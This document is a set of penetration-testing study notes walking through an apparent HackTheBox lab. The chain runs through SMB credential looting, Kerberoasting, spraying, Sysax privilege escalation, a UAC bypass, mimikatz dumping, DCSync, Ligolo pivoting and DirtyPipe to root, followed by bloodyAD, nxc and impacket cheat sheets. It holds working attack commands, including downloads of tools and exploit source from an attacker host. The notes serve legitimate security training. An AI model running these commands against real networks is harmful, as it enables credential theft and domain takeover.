impacket-smbclient inlanefreight.local/ssmalls:'Str0ngpass86!'@172.16.8.3
# use> shares
# use> use 'Department Shares'   → cd IT\Private\Development → get "SQL Express Backup.ps1"
# use> use SYSVOL                → get INLANEFREIGHT.LOCAL\scripts\adum.vbs
```

**Gotcha — filenames with spaces:** 
`get SQL Express Backup.ps1` → `NT_STATUS_OBJECT_NAME_NOT_FOUND`. You **must quote it**: `get "SQL Express Backup.ps1"`. Same for `cd` into spaced paths.

Loot found:

- `IT/Private/Development/SQL Express Backup.ps1` → hardcoded **`backupadm`** creds (keyboard-walk password), `backupadm : !qazXSW@`
- SYSVOL `scripts/adum.vbs` → `account:L337^p@$$w0rD` (old, not in BloodHound → likely stale, note as *Sensitive Data on File Shares*).

### **Why shares here — and the enum loop (memorize this):** 

Why switch to a new user, and how to know what a cred can do: You switch when the current user is exhausted (BloodHound dead-end, no admin, shares drained) and you hold an untested cred — because access in AD is per-user (different groups → different admin/RDP/WinRM rights). Not "because I can" — because a fresh cred is a fresh attack surface, and you often need just one user with the one right access.

We changed ssmalls' password → checked ssmalls in BloodHound → nothing (no ACL path, no admin, no group to DA). When the graph dead-ends, the next question is always "what can this cred read that it shouldn't?" → shares, where orgs leave passwords (scripts, configs, backups, web.config, .ps1 with hardcoded creds). Run shares per credential — access is per-user.

Read markers: [+] = valid · (Pwn3d!) = admin / shell here · [-] = rejected. Cross-check BloodHound edges (CanRDP, CanPSRemote, AdminTo, MemberOf) — they show the access before you even test. Inside a shell, confirm with whoami /groups + whoami /priv. (This sweep is exactly how backupadm was found to WinRM into MS01.)

- Only a CRED (no shell) → _remote/domain enum: BloodHound → Shares → Kerberoast → Spray. (You can't see a host's tasks/apps/services yet — those live on hosts, and you have no session.)
- Admin on a host (Pwn3d!) or a shell on it → local/privesc enum: scheduled tasks, services, 3rd-party apps + versions, unattend.xml, WinPEAS → privesc → dump creds.
- Loop: cred → remote enum → get on a host → local enum → new cred → repeat.


## Step 4 — Kerberoast + BloodHound path (kit: impacket-GetUserSPNs) (A try for ssmalls)


While checking BloodHound for ssmalls, three possible paths:

#### **Case 1 — MemberOf → DCSync directly** 

`ssmalls -[MemberOf]-> Domain Admins`

→ ssmalls is already DA, skip straight to DCSync:

```bash
impacket-secretsdump INLANEFREIGHT.LOCAL/ssmalls:'Str0ngpass86!'@dc01.inlanefreight.local -dc-ip 172.16.8.3
```

#### **Case 2 — GenericAll → add to DA → DCSync** 

`ssmalls -[GenericAll]-> Domain Admins` 

→ ssmalls can add themselves to DA group first:

```bash
bloodyAD --host 172.16.8.3 -d inlanefreight.local -u ssmalls -p 'Str0ngpass86!' add groupMember "Domain Admins" ssmalls

impacket-secretsdump INLANEFREIGHT.LOCAL/ssmalls:'Str0ngpass86!'@dc01.inlanefreight.local -dc-ip 172.16.8.3
```

**Both cases — PTH with the admin hash:**

```bash
evil-winrm -i 172.16.8.3 -u administrator -H '<NTLMHASH>'
```

#### **Case 3 — No DA path found → Kerberoast** 

`ssmalls has no useful ACL path → try SPN accounts`

in the HTB example, its found that `ssmalls -[MemberOf]-> Domain Users` — not Domain Admins. Domain Users is just the default group every account is in, no privileges at all.

```bash
impacket-GetUserSPNs inlanefreight.local/ssmalls:'Str0ngpass86!' -dc-ip 172.16.8.3

impacket-GetUserSPNs inlanefreight.local/ssmalls:'Str0ngpass86!' -dc-ip 172.16.8.3 -request -outputfile spns.hash

hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt

```

> **Gotcha:** `KRB_AP_ERR_SKEW` → re-sync time (`sudo ntpdate 172.16.8.3`). Add `-k` only if NTLM is blocked.

Several SPN accounts found (mssqlsvc, backupjob, svc_sql…). One cracks but BloodHound shows it's not useful → still a finding: **Weak Kerberos Config (Kerberoasting)**.

Tips: if hashcat shows exhausted, try with rules `hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule` 

## Step 5 — Password spray + misc checks (kit: nxc modules) (A try for ssmalls)

```bash

# first build the user list (nxc prints them; strip to just samaccountnames):
nxc smb 172.16.8.3 -u ssmalls -p 'Str0ngpass86!' --users | awk '{print $5}' | grep -v '^$' > users.txt

# spray ONE password across all users (never many pws on one user → lockout):
nxc smb 172.16.8.3 -u users.txt -p 'Welcome1' --continue-on-success

# → kdenunez:Welcome1, mmertle:Welcome1 (neither privileged) — finding: Weak AD Passwords

# GPP autologin passwords in SYSVOL:
nxc smb 172.16.8.3 -u ssmalls -p 'Str0ngpass86!' -M gpp_autologin

# passwords in AD description fields:
nxc ldap 172.16.8.3 -u ssmalls -p 'Str0ngpass86!' -M get-desc-users

# → frontdesk:ILFreightLobby! (not useful) — finding: Passwords in AD Description Field
```

A cred is **useless** if `nxc smb/winrm/rdp 172.16.8.0/24 -u USER -p PASS` shows no `(Pwn3d!)` / `[+]` access anywhere **and** BloodHound shows only `Domain Users` with no outbound edge — note it as a finding and move on.

## Step 6 — Find a host you can log into (kit: nmap + evil-winrm over Ligolo) 

As we found nothing for `ssmalls`, lets target the user `backupadm`.

`nxc rdp 172.16.8.0/23 -u backupadm -p '!qazXSW@'` shows available for both `172.16.8.20` and `172.16.8.50`. although in .20 the user is as admin, but the logic is always: go where you haven’t been yet, not where you already got creds from. so lets explore `172.16.8.50`

WinRM = your way onto a box. Scan natively (no proxychains):

```bash
nmap -p 5985 172.16.8.50          # MS01 → open

evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
```

You land on **MS01 (`ACADEMY-AEN-MS01`)**. 

If you get into **Double-hop problem**:

**fix:** a WinRM logon doesn't cache your password, so any command that reaches a *second* host (the DC) has no creds to present → `Access Denied`. **Fix: build a PSCredential and pass it explicitly** so the command re-auths itself:

```powershell
$sec  = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $sec)
Get-DomainUser -Credential $cred            # PowerView, now reaches the DC
Get-DomainGroupMember 'Domain Admins' -Credential $cred
```
 
Easier (kit) fix: don't fight it — run AD enum from your attack box over Ligolo (bloodhound-python, nxc, bloodyAD with -u/-p). Auth happens from your box, so there's no second hop at all. Only use the PSCredential trick when you must run something on the WinRM host.

 
## Step 7 — Local privesc on MS01 → creds (host-local tools, kept)

### (7.1) Enumeration

**BloodHound collects AD data, not local machine data**. MS01 is just a **member server** — it has no AD database. All AD info (users, groups, ACLs, paths) lives only on the **DC (172.16.8.3)**,. So no matter which host you’re targeting or pivoting through, BloodHound **always** needs to reach the DC. so bloodhound wont work on MS01.

backupadm isn't admin and `whoami /priv` is bare. Hunt creds:

Now transfer a tool from you machine to the rdp machine of `172.16.8.50` over ligolo and  run **winPEAS** — it automates all of this.

```bash
# on ligolo teminal
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# on your attack box
python -m http.server 4444


#on machine 172.16.8.50, check witable path by this user

icacls C:\ProgramData
icacls C:\Windows\Tasks
icacls C:\Temp
icacls C:\Users\Public


#the C:\ProgramData path is writable by the user backupadm

certutil -urlcache -split -f http://172.16.8.120:4444/w.exe C:\Users\Public\wp.exe

# run it
.\C:\Users\Public\wp.exe

# winpeas works best with high privilege user.

```

- WinPEAS found SysaxAutomation.

**Manually run these 5 commands, always, on every box:**

```
type C:\Windows\Panther\unattend.xml 2>nul
type C:\Windows\Panther\Unattended.xml 2>nul
type C:\Windows\System32\sysprep\sysprep.xml 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon"
cmdkey /list
```

**3. If still nothing:**

```cmd
dir C:\ /s /b *.xml 2>nul | findstr -i "unattend\|sysprep\|autologon"
dir C:\ /s /b *.ini 2>nul | findstr -i "pass\|cred"
```

First look for cred files: `C:\panther\unattend.xml` → local user **`ilfserveradm:Sys26Admin`** (has RDP, not admin).  Aa per access denied, we had to manually open the file to check anything in there. you can automate with 

### (7.2) Exploit sysaxschedscp

Lets move on with the found creds! `nxc` says `ilfserveradm:Sys26Admin` has rdp but not admin. And we also found sysaxschedscp. **backupadm couldn’t RDP into MS01** but had only winrm option.

- The Sysax GUI (`sysaxschedscp.exe`) needs a **desktop/GUI session** → only possible via **RDP**

#### **RDP to MS01 over Ligolo** 

full flags so it doesn't choke on cert/NLA:

```bash
xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:'Sys26Admin' /cert:ignore /dynamic-resolution
```

The `/drive:loot` part is just a local folder on **your** machine that gets mounted inside the RDP session. DMZ01 has nothing to do with it — Ligolo handles the routing transparently.

On MS01, find non-standard **SysaxAutomation** (`C:\Program Files (x86)\SysaxAutomation`) 

→ [EDB-50834] LPE: its scheduled service runs as SYSTEM. Steps:

  - Open `C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe`
- Select `Setup Scheduled/Triggered Tasks`
- Add task (Triggered)
- Update folder to monitor to be `C:\Users\ilfserveradm\Documents`
- Check `Run task if a file is added to the monitor folder or subfolder(s)`
- Choose `Run any other Program` and choose `C:\Users\ilfserveradm\Documents\pwn.bat`
- Uncheck `Login as the following user to run task`
- Click `Finish` and then `Save`

Finally, to trigger the task, create a new .txt file in the `C:\Users\ilfserveradm\Documents` directory. We can check and see that the `ilfserveradm` user was added to the `Administrators` group by `net localgroup administrators` .

## Getting an elevated (admin) shell after Sysax

Your current RDP session still has the **old non-admin permissions**, because Windows builds them at login. Pick one option:

**Option A (cleanest): log out of RDP and back in**

```bash
xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:'Sys26Admin' /cert:ignore /dynamic-resolution +clipboard /drive:loot,/home/htb-ac-1094410/loot
```

Then right-click PowerShell → **Run as Administrator** → click **Yes**.

**Option B (no re-login): UAC password prompt**

```powershell
Start-Process powershell -Verb RunAs
```

UAC asks for a password → **More choices** → username `.\ilfserveradm` → password `Sys26Admin`.
(`.\` means the **local** account. `INLANEFREIGHT\ilfserveradm` doesn't exist in the domain, so it fails.)

**Option C (UAC bypass, fodhelper): skips the Yes/No prompt**

```powershell

New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force; New-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell" -Force; Start-Process fodhelper.exe
```

> ⚠ Only works if you were **already admin when you logged in** (so do Option A first) and UAC isn't set to "Always notify". If it shows a password prompt instead, it failed → use Option A or B.

Cleanup after:

```powershell
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

**Check you're elevated:**

```powershell
whoami /groups | findstr "High Mandatory"
```


## **mimikatz** 

```bash
listener_add --addr 0.0.0.0:449 --to 127.0.0.1:449 --tcp


python -m http.server 449


certutil -urlcache -split -f http://172.16.8.120:449/m.exe C:\Users\ilfserveradm\Documents\m.exe

# transfer Inveigh too
```

`privilege::debug` → `token::elevate` → `sekurlsa::logonpasswords` ---> `lsadump::secrets`:

  - `DefaultPassword : DBAilfreight1!` 
  - Also gives a ntlm hash of `mssqladm`, you can just hashcat it!
  
As per HTB:

We find a set password but no associated username. This appears to be for an account configured with autologon, so we can query the Registry to find the username.

```powershell
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
```

  - registry `DefaultUserName = mssqladm` → new cred **`mssqladm:DBAilfreight1!`**.


#### **Inveigh** (local admin) captures inbound auth 

Transfer like same:

```powershell
Import-Module .\inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```

If you find a NTLMv2 creds, crack it too `hashcat -m 5600 mpalledorous.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`



## Windows host — cred hunting order

**As low-priv (before admin):**
1. `winPEAS` → find the LPE vector (and any creds it can already read)

**After admin/SYSTEM** — mimikatz in an *elevated* shell, always start with:
1. `privilege::debug` → `token::elevate`. `token::elevate` makes mimikatz **borrow a SYSTEM token**. It finds a process already running as `NT AUTHORITY\SYSTEM`, copies its token, and runs mimikatz’s own commands as SYSTEM.
2. `lsadump::secrets` → service account / autologon plaintext creds (found mssqladm here)
3. `sekurlsa::logonpasswords` → hashes (sometimes plaintext) of users logged in right now
4. `lsadump::sam` → local user NTLM hashes (try for local admin password reuse)
5. `lsadump::cache` → cached domain logons (DCC2, crack with `-m 2100`, can't pass-the-hash)
6. `lazagne all` → browser, app, WiFi, saved creds (best on workstations)
7. `Inveigh` → only to capture network hashes (leave running, check later)

**Kit shortcut — same dumps from your attack box, no upload:**

```bash
nxc smb <IP> -u <admin> -p '<pass>' --sam --lsa
nxc smb <IP> -u <admin> -p '<pass>' -M lsassy      #Logged-in users’ hashes/passwords, sassy reads LSASS memory, and only admins can do that
```


## (Optional) Guide alternatives — HTB module's original tools

- **SharpHound.exe on DEV01** (instead of bloodhound-python): upload via DNN, run `SharpHound.exe -c All`, download the zip. Same data.
- **PowerView over RDP** (instead of bloodyAD): `ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@<dmz01>` → `xfreerdp /v:127.0.0.1:13389 ...` → `Set-DomainUserPassword -Identity ssmalls ...`. bloodyAD avoids all of it.
- **proxychains crackmapexec** (instead of nxc): identical modules (`spider_plus`, `gpp_autologin`), just the dead tool + a SOCKS hop.
- **Snaffler** (instead of nxc spider_plus): richer share triage on-host if you want it.

##### **A little WinPEAS tutorial:**

**Check LAST (low value / risky as low-priv):**
- Windows Version Vulnerabilities (CVE list) → unverified version matches; kernel exploits can crash the box, so try misconfigs first
- Audit/WEF settings → info only
- LAPS → info only as low-priv (later, ReadLAPSPassword in BloodHound = local admin pass)
- Hardware/DMA/BitLocker → physical access needed

**ALWAYS check these sections:**

|Section|What you're looking for|
|---|---|
|**Current Token Privileges**|`SeImpersonate` / `SeAssignPrimaryToken` → PrintSpoofer/GodPotato = SYSTEM; `SeBackup` → dump SAM/SYSTEM|
|**User/System ENV variables**|Unusual software in PATH (found Sysax here)|
|**Installed Applications**|Non-standard software = check for known LPEs|
|**Autologon / Registry creds**|Plaintext passwords in registry|
|**Unattend files**|Plaintext passwords in setup files|
|**Saved credentials**|cmdkey stored creds → `runas /savecred`|
|**PowerShell history / cred files**|`ConsoleHost_history.txt`, config files with passwords|
|**Services with weak permissions**|Can you replace the binary or change its config?|
|**Unquoted service paths**|Path with spaces, no quotes, and a folder you can write to|
|**Scheduled Tasks**|Runs as SYSTEM? Path writable by you?|
|**AlwaysInstallElevated**|If both keys = 1 → malicious MSI = SYSTEM|

**The golden rule:**

> A red finding = "this MIGHT be exploitable, go verify"
> It does NOT mean "this works, run it now"

**Your verification order:**

1. Is the service/feature running, or can you start/restart it (or does it run on reboot)?
2. Do you have write access to the path or config it mentions?
3. Does a known working exploit exist for it?

If all 3 = yes → exploit it. Otherwise skip and move on.

---
---

# Phase 9 — AD Compromise (mssqladm → ttimmons → DCSync)

- **Starting cred:** `mssqladm:DBAilfreight1!`
- nxc: smb true on 1`72.166.8.3` (rdp true on previous hosts, so lets move forward not backward.)
- BloodHound shows: `mssqladm -[GenericWrite]-> ttimmons`

→ Set a fake SPN on ttimmons → targeted Kerberoast → crack → DA path

## Step 1 — Set fake SPN on ttimmons (kit: bloodyAD)

```shell
bloodhound-python -u mssqladm -p 'DBAilfreight1!' -d inlanefreight.local -ns 172.16.8.3 --dns-tcp -c All --zip
```

```bash
bloodyAD --host 172.16.8.3 -d inlanefreight.local -u mssqladm -p 'DBAilfreight1!' set object ttimmons servicePrincipalName -v 'acmetesting/LEGIT'
```

The trick is:

1. `ttimmons` has **no SPN** → can’t Kerberoast them normally (Kerberos only issues tickets for accounts with SPNs)
2. You have **GenericWrite** over ttimmons → you can **add a fake SPN** to their account
3.  the DC issues a **service ticket (TGS)** that is encrypted with **ttimmons’ password hash**. That encryption is why cracking the ticket gives you their password.
4. This only works if ttimmons has a **weak password**. A strong one won’t crack, which is why it showed up as a finding.

**Note:** delete this SPN after the engagement and document it in the report appendices.

## Step 2 — Targeted Kerberoast ttimmons (kit: impacket)

```bash
impacket-GetUserSPNs inlanefreight.local/mssqladm:'DBAilfreight1!' -dc-ip 172.16.8.3 -request-user ttimmons -outputfile ttimmons.hash
```

## Step 3 — Crack the hash

```bash
hashcat -m 13100 ttimmons.hash /usr/share/wordlists/rockyou.txt
```

→ cracks → `ttimmons:<PASSWORD>`

## Step 4 — Check ttimmons in BloodHound

`ttimmons -[GenericAll]-> Server Admins`

`Server Admins -[DCSync]-> Domain`

→ add ttimmons to Server Admins → DCSync → game over

## Step 5 — Add ttimmons to Server Admins (kit: bloodyAD)

```bash
bloodyAD --host 172.16.8.3 -d inlanefreight.local -u ttimmons -p 'Repeat09' add groupMember "Server Admins" ttimmons
```

## Step 6 — DCSync (kit: impacket-secretsdump)

```bash
impacket-secretsdump INLANEFREIGHT.LOCAL/ttimmons:'Repeat09'@dc01.inlanefreight.local -dc-ip 172.16.8.3 -just-dc-ntlm
```

→ dumps all NTLM hashes including `Administrator`

## Step 7 — PTH as Administrator

```bash
evil-winrm -i 172.16.8.3 -u administrator -H '<NTLMHASH>'
```

> **Post-DA steps worth adding to report:** RDP to DC01, run `hostname && whoami && ipconfig /all` for screenshot evidence. Full NTDS dump for password audit. Test if client detects adding a new DA account (document in appendices, give credit if they catch it).

---
---

# Phase 10 — Post-Exploitation & Double Pivot (DC01 → MGMT01)

Post-DA actions worth doing (add value to report)

| Action                   | Tool                | What it shows                                  |
| ------------------------ | ------------------- | ---------------------------------------------- |
| Domain password analysis | DPAT                | % cracked, top 10 passwords, DA hashes cracked |
| AD security audit        | PingCastle          | Hardening recommendations for appendices       |
| Sensitive share hunting  | evil-winrm browse   | Show access to HR, Finance, R&D, Executives    |
| DLP simulation           | mock data exfil     | Tests client's data loss prevention controls   |
| Domain trust attacks     | bloodyAD / impacket | Child→parent, forest trust abuse               |

> **Report rule:** screenshot file listings only — never open files or remove data from the network.

## Step 1 — Log into DC01 as Administrator (PTH)

```bash
evil-winrm -i 172.16.8.3 -u administrator -H '<NTLMHASH>'
```

Browse shares on DC01:

```powershell
cd "C:\Department Shares\IT\Private\Networking"
dir
```

→ finds SSH private keys for multiple users

## Step 2 — Discover the third network (172.16.9.0/23)

```powershell
# DC01 has a second NIC:
ipconfig /all
# → Ethernet1: 172.16.9.3

# ping sweep to find live hosts:
1..254 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
# → 172.16.9.25 is alive (MGMT01)
# 172.16.9.3
```

## Step 3 — Download SSH keys from DC01

```powershell
download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" /tmp/ssmallsadm-id_rsa
```

## Step 4 — Double pivot: reach 172.16.9.25 via Ligolo (kit approach)

The module uses Metasploit + proxychains for the double pivot. **Kit version — Ligolo double pivot** (cleaner):

```bash
## Ligolo Double Pivot (DMZ01 → DC01 → 172.16.9.0/24)

# on attack box — create 2nd tun (user = whoever runs the proxy):
sudo ip tuntap add user htb-ac-1094410 mode tun ligolo2

sudo ip link set ligolo2 up

# in Ligolo console (while on DMZ01 session) — relay so DC01 can reach your proxy. Always remember, Add the listener on the previous hop’s session for any next hop:

listener_add --addr 0.0.0.0:11601 --to 10.10.14.176:11601

# on DC01 (evil-winrm) — upload + run agent, connect to DMZ01's internal IP:

upload /home/htb-ac-1094410/ligolo-ng-agent-windows_amd64.exe

.\ligolo-ng-agent-windows_amd64.exe -connect 172.16.8.120:11601 -ignore-cert


# in Ligolo console (select DC01 session):
session → select DC01
start --tun ligolo2

# on attack box:
sudo ip route add 172.16.9.0/24 dev ligolo2

# verify and connect:
ping -c 2 172.16.9.25
ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
```



## Step 5 — SSH into MGMT01

```bash
chmod 600 /tmp/ssmallsadm-id_rsa

ssh -i /tmp/ssmallsadm-id_rsa ssmallsadm@172.16.9.25
# → Ubuntu 20.04, kernel 5.10.0
```

## Step 6 — Linux LPE on MGMT01 (DirtyPipe CVE-2022-0847)


**DirtyPipe:** a kernel bug that lets you write into files you can only read, so you overwrite a root-owned SUID binary (which always runs as root) with code that gives you a shell, run it, and you’re root. `find / -perm -4000` lists those binaries.

```bash

# check kernel — DirtyPipe affects 5.8 up to 5.10.102 / 5.15.25 / 5.16.11
uname -a
# → 5.10.0 → vulnerable

# find SUID binaries (exploit-2 needs one owned by root)
find / -perm -4000 2>/dev/null
# → use /usr/lib/openssh/ssh-keysign (any root SUID works; if one fails, try another)

# get exploit-2.c onto MGMT01 (github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)

# compile ON the target — binaries built on Parrot can fail on Ubuntu 20.04 (glibc mismatch)

# Ligolo console — select DC01 session (the hop MGMT01 can reach):

listener_add --addr 0.0.0.0:8889 --to 127.0.0.1:8889 --tcp

# attack box — in the folder that has exploit-2.c:

python3 -m http.server 8889

# MGMT01 — use DC01's IP in MGMT01's network (172.16.9.3, not 172.16.8.3):

cd /tmp

wget http://172.16.9.3:8889/exploit-2.c

gcc exploit-2.c -o dirtypipe

chmod +x dirtypipe

./dirtypipe /usr/lib/openssh/ssh-keysign
# → root shell

# cleanup after: rm /tmp/sh /tmp/dirtypipe /tmp/exploit-2.c
```



**Finding:** Unpatched Linux kernel (DirtyPipe) on crown jewels server — Critical.

**exploit-1 vs exploit-2:** exploit-1 overwrites `/etc/passwd` to change root’s password (risky, because you’re editing a critical file on the client’s server), while exploit-2 briefly patches a SUID binary to drop a root shell at `/tmp/sh` and then restores it (safer, nothing permanent changes). So use exploit-2 and just delete `/tmp/sh` afterwards.



---
---


**In a real engagement without a specific goal, after getting DA you’d do this order:**

- **DCSync → dump all hashes (already done)**
- **Check DC01 itself → sensitive files, shares, config**
- **Network recon → ipconfig /all → any other NICs? (found 172.16.9.0/23 here)**
- **Shares → hunt sensitive data**
- **New subnets → pivot deeper**

---

### ligolo-ng

**Example: 3rd hop through MGMT01 into a made-up `172.16.10.0/24`:**

```bash
# attack box — new tun:
sudo ip tuntap add user htb-ac-1094410 mode tun ligolo3
sudo ip link set ligolo3 up

# Ligolo console — select DC01 session (previous hop), add relay:

listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

# 11601 can stay same at every hop.

# on MGMT01 — run Linux agent, connect to DC01's IP in MGMT01's network:

chmod +x agent./agent -connect 172.16.9.3:11601 -ignore-cert

# Ligolo console — select MGMT01 session, start on ligolo3:

session → select MGMT01start --tun ligolo3

# attack box — route the new network through ligolo3:

sudo ip route add 172.16.10.0/24 dev ligolo3
```

---

# bloodyAD Cheat Sheet — BloodHound edge → abuse 

Every command starts with the same login part, `B`:

```bash
B="bloodyAD --host 172.16.8.3 -d inlanefreight.local -u <user> -p '<pass>'"
# with a hash instead of a password:  -p ':<NTHASH>'
```

## Enumerate first

| Goal | Command |
|---|---|
| What can I write to? (your outbound rights) | `$B get writable --detail` |
| Which groups am I in? | `$B get membership <user>` |
| Show all attributes of an object | `$B get object <target>` |

## BloodHound edge → bloodyAD abuse

| Edge you have | Target | What you do | Command | Then |
|---|---|---|---|---|
| **ForceChangePassword** | user | Reset their password | `$B set password <target> 'NewPass123!'` | Log in as them |
| **GenericWrite / GenericAll** | user | Targeted Kerberoast (add a fake SPN) | `$B set object <target> servicePrincipalName -v 'fake/LEGIT'` | `impacket-GetUserSPNs ... -request-user <target>` → crack with `-m 13100` |
| **GenericWrite / GenericAll** | user | AS-REP roast (turn off pre-auth) | `$B add uac <target> -f DONT_REQ_PREAUTH` | `impacket-GetNPUsers ...` → crack with `-m 18200` |
| **GenericWrite / GenericAll** | user | Shadow Credentials (get their NT hash, no cracking) | `$B add shadowCredentials <target>` | Prints the NT hash → pass-the-hash |
| **GenericAll / AddMember / AddSelf** | group | Add yourself to the group | `$B add groupMember "<group>" <user>` | Re-login to pick up the new group's rights |
| **WriteDACL** | domain | Give yourself DCSync | `$B add dcsync <user>` | `impacket-secretsdump ... -just-dc-ntlm` |
| **WriteDACL** | any object | Give yourself GenericAll on it | `$B add genericAll <target> <user>` | Use any GenericAll row above |
| **WriteOwner / Owns** | any object | Make yourself the owner, then give yourself GenericAll | `$B set owner <target> <user>` → `$B add genericAll <target> <user>` | Use any GenericAll row above |
| **GenericWrite / GenericAll** | computer | RBCD: create a machine account, then allow it to impersonate users on the target | `$B add computer evilpc 'Passw0rd!'` → `$B add rbcd 'TARGET$' 'evilpc$'` | `impacket-getST -spn cifs/target.domain -impersonate administrator domain/evilpc$:'Passw0rd!'` |
| **ReadLAPSPassword** | computer | Read the local admin password | `$B get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd` | Log in as local admin |
| **ReadGMSAPassword** | gMSA | Read the service account's hash | `$B get object 'svc_gmsa$' --attr msDS-ManagedPassword` | Pass-the-hash |
| **GenericAll** | disabled user | Re-enable the account | `$B remove uac <target> -f ACCOUNTDISABLE` | Log in as them |

## Cleanup (note each change in the report appendices)

| Undo | Command |
|---|---|
| Fake SPN | `$B set object <target> servicePrincipalName` (no `-v` clears it) |
| Pre-auth flag | `$B remove uac <target> -f DONT_REQ_PREAUTH` |
| Group membership | `$B remove groupMember "<group>" <user>` |
| DCSync rights | `$B remove dcsync <user>` |
| RBCD | `$B remove rbcd 'TARGET$' 'evilpc$'` |

**Memory trick:** a user edge means change, roast, or steal a key. A group edge means join it. A domain edge with WriteDACL means DCSync.

---
# nxc + impacket Cheat Sheet (CPTS)

Placeholders: `<IP>` = target, `<DC>` = DC IP, `DOMAIN` = e.g. `inlanefreight.local`

## Reading nxc output

| Symbol | Meaning |
|---|---|
| `[*]` | Port open, host reachable — login NOT tested yet |
| `[+]` | Login worked |
| `[-]` | Login failed |
| `(Pwn3d!)` | You're admin there (can dump / exec) |

## nxc (NetExec)

**Auth options (work with every protocol):**
- password: `-u user -p 'pass'`
- hash (pass-the-hash): `-u user -H '<NTHASH>'`
- local account (not domain): add `--local-auth`
- protocols: `smb`, `winrm`, `rdp`, `ldap`, `mssql`, `ssh`

### When to use `--local-auth` (it's about WHOSE account, not about admin)

| Account | Exists where | Use `--local-auth`? |
|---|---|---|
| Domain user (`ssmalls`, `mssqladm`, `backupadm`) | In AD, works on every domain machine | **No** |
| Local user (`ilfserveradm`, a local `Administrator` hash from `lsadump::sam`) | Only on that one machine | **Yes** |

- Came from BloodHound, the DC, or `nxc --users` → domain account, so no `--local-auth`.
- Came from one machine (`unattend.xml`, `lsadump::sam`, `--sam`) → local account, so add `--local-auth`.
- Not sure? Try both. Whichever one shows `[+]` is right.

**Admin is a separate question:** `(Pwn3d!)` = dump/exec commands (lsassy, `--sam`, `--lsa`) work. `[+]` only = they fail, with or without `--local-auth`.
`--local-auth` only gets you logged in. It doesn't give you admin rights.

> Gotcha: a local account that IS admin may still show only `[+]` over the network (Remote UAC strips it). Fix: run mimikatz in RDP, or set `LocalAccountTokenFilterPolicy=1` (note it in the report, set back to 0 after).

| Goal | Command |
|---|---|
| Find hosts + check a cred on a whole range | `nxc smb 172.16.8.0/23 -u user -p 'pass'` |
| Where can I WinRM / RDP? | `nxc winrm 172.16.8.0/23 -u user -p 'pass'` / `nxc rdp ...` |
| Null session | `nxc smb <DC> -u '' -p ''` |
| Guest session | `nxc smb <DC> -u guest -p ''` |
| List shares + my access | `nxc smb <IP> -u user -p 'pass' --shares` |
| Crawl all readable shares | `nxc smb <IP> -u user -p 'pass' -M spider_plus` (add `-o DOWNLOAD_FLAG=True` to download) |
| List domain users | `nxc smb <DC> -u user -p 'pass' --users` |
| List groups | `nxc smb <DC> -u user -p 'pass' --groups` |
| Password policy (check lockout before spraying!) | `nxc smb <DC> -u user -p 'pass' --pass-pol` |
| RID cycling (users without a user list) | `nxc smb <DC> -u guest -p '' --rid-brute` |
| Password spray (ONE pass, all users) | `nxc smb <DC> -u users.txt -p 'Welcome1' --continue-on-success` |
| GPP passwords in SYSVOL | `nxc smb <DC> -u user -p 'pass' -M gpp_password` / `-M gpp_autologin` |
| Passwords in AD description fields | `nxc ldap <DC> -u user -p 'pass' -M get-desc-users` |
| Kerberoast | `nxc ldap <DC> -u user -p 'pass' --kerberoasting spns.hash` |
| AS-REP roast | `nxc ldap <DC> -u user -p 'pass' --asreproast asrep.hash` |
| BloodHound collection | `nxc ldap <DC> -u user -p 'pass' --bloodhound -c All --dns-server <DC>` |
| Read LAPS passwords | `nxc ldap <DC> -u user -p 'pass' --laps` |
| Hosts without SMB signing (relay targets) | `nxc smb 172.16.8.0/23 --gen-relay-list relay.txt` |
| **Needs admin (Pwn3d!) ↓** | |
| Dump local SAM hashes | `nxc smb <IP> -u admin -p 'pass' --sam` |
| Dump LSA secrets (autologon/service plaintext) | `nxc smb <IP> -u admin -p 'pass' --lsa` |
| Dump LSASS (logged-in users) | `nxc smb <IP> -u admin -p 'pass' -M lsassy` |
| Dump NTDS (on a DC, needs DA) | `nxc smb <DC> -u admin -p 'pass' --ntds` |
| Run a command | `nxc smb <IP> -u admin -p 'pass' -x 'whoami'` (`-X` = PowerShell) |
| MSSQL query | `nxc mssql <IP> -u user -p 'pass' -q 'SELECT @@version'` |

---

## impacket

**Auth options:**
- password: `DOMAIN/user:'pass'@<IP>`
- hash: `DOMAIN/user@<IP> -hashes :<NTHASH>` (note the colon in front)
- Kerberos ticket: `export KRB5CCNAME=user.ccache` then `-k -no-pass` (use the hostname, not the IP)

| Goal | Command |
|---|---|
| AS-REP roast (no creds needed) | `impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip <DC> -format hashcat -outputfile asrep.hash` → crack `-m 18200` |
| Kerberoast: list SPN accounts | `impacket-GetUserSPNs DOMAIN/user:'pass' -dc-ip <DC>` |
